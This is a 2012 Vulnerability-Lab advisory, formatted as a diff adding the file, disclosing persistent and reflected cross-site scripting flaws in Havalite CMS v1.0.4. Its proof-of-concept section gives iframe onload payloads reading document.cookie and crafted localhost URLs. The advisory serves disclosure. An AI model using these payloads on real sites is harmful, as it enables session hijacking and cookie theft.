@@ -1,0 +1,204 @@
+Title:
+======
+Havalite CMS v1.0.4 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-04-23
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=520
+
+
+VL-ID:
+=====
+520
+
+
+Introduction:
+=============
+Havalite, a lightweight, open source CMS, based on php and SQLite. It\\\\\\\'s licensed under the GNU General Public 
+License.
+
+- A Mobile Detector to switch in Mobile mode
+- Simple 1 step wizard installation
+- Text, Images and swf files all saved as data in Sqlite Database
+- Two different image sizes: Original and Thumnail
+- Backup for the whole system including images in only one Sqlite file. SqLite3 and above allows storing Blobs and a 
+better Utf-8 performance
+- Export database to any Server without changing a single line or database structure.
+- A lite weight and clear interface
+- Many Interface languages done on the fly with our language Creator Tool
+- FCKEditor a great WYSIWYG Text-Editor
+- integration of third-party Plugins, specially jQuery, with the ability of plugin configuration
+- plenty of useful functions for Theme creation + Theme Preview, and Plugins Creation
+- RSS Feeds for Posts, Categories and Comments
+
+(Copy of the Vendor Homepage: http://havalite.com )
+
+
+
+Abstract:
+=========
+The Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in Havalite CMS v1.0.4.
+
+
+Report-Timeline:
+================
+2012-04-23:     Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Medium
+
+
+Details:
+========
+1.1
+Multiple persistent input validation vulnerabilities are detected in Havalite v1.0.4 Content Management System.
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
+context manipulation. Exploitation requires low user inter action because the admin needs to watch the user list.
+The user includes his scriptcode as profile name and the code is getting executed on the administrator section 
+persistent.
+
+
+Vulnerable Module(s):
+                                [+] findReplace - Input/Output Listing
+                                [+] Username Profile Input & Username Login or Input Message Miscellaneous [postAuthor]
+
+Picture(s):
+                                ../1.png
+                                ../2.png
+
+
+1.2
+Multiple non persistent cross site scripting vulnerabilities are detected in Havalite v1.0.4 Content Management System.
+The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required 
+user inter action or local low privileged user account. Successful exploitation can result in account steal, phishing 
+& client-side content request manipulation.
+
+
+Vulnerable Module(s):
+                                [+] postID
+                                [+] userID
+                                [+] linkID
+
+Picture(s):
+                                ../3.png
+                                ../4.png
+
+
+Proof of Concept:
+=================
+1.1
+The persistent input validation vulnerabilities can be exploited by remote attacker with low or medium required 
+user inter action. For demonstration or reproduce ...
+
+Review: findReplace - Replace
+
+<td id="catSplitter" valign="top" width="350"><form id="form1" name="form1" method="post" action="">
+Find:
+<input name="find" id="find" style="width: 100%;" type="text">
+<iframe src="findReplace.php-Dateien/a.htm" onload="alert(document.cookie)" <"="">
+Replace:
+<input name="replace" type="text" id="replace" style="width:100%;" 
+value=""><iframe src=a onload=alert(document.cookie) <" />
+<span style="display:block; text-align:right; padding:10px 0;">
+<label><input name="findOpt" type="radio" value="find" 
+checked="checked" />
+Find only</label>
+<label><input name="findOpt" type="radio" value="replace" 
+/>Find and Replace</label>
+</span>
+<span style="display:block; text-align:right; padding:10px 0;">
+<input type="submit" name="Submit" value="    Replace in all posts 
+
+</span>
+</form>
+
+URL: http://127.0.0.1:8080/havalite/findReplace.php
+
+
+Review: Login Username Form & Edit Article Module
+
+<tr>
+<td id="log_text">Username</td>
+<td><input name="username" id="username" type="text">
+<iframe src="hava_login.php-Dateien/a.htm" onload='alert("Vulnerabilitylab")' <"="" autofocus="autofocus"></td>
+
+URL: http://127.0.0.1:8080/havalite/hava_login.php
+
+... or via miscellaneous module postAuthor
+
+<input name="postAuthor" type="text" id="postAuthor" value="admin"> 
+Date: <input name="postDate" type="text" id="postDate" value="11-10-14 15:42:40" />
+
+URL: http://127.0.0.1:8080/havalite/hava_post.php?postId=1
+
+
+1.2
+The client side cross site scripting vulnerabilities can be exploited by remote attacker with medium or high required 
+user inter action. For demonstration or reproduce ...
+
+PoC:
+http://127.0.0.1:8080/havalite/hava_post.php?postId=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+http://127.0.0.1:8080/havalite/hava_user.php?userId=>"<iframe src=http://www.vulnerability-lab.com>
+http://127.0.0.1:8080/havalite/hava_link.php?linkId=1%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+
+
+Risk:
+=====
+1.1
+The security risk of the persistent input validation vulnerabilities are estimated as medium(+).
+
+1.2
+The security risk of the client side cross site scripting vulnerabilities are estimated as low(+).
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team]   -    Benjamin Kunz Mejri (Rem0ve)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all 
+warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. 
+Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss 
+of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such 
+damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
+limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from 
+Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, 
+including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+                                                Copyright © 2012 Vulnerability-Lab
+
+
+
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research () vulnerability-lab com
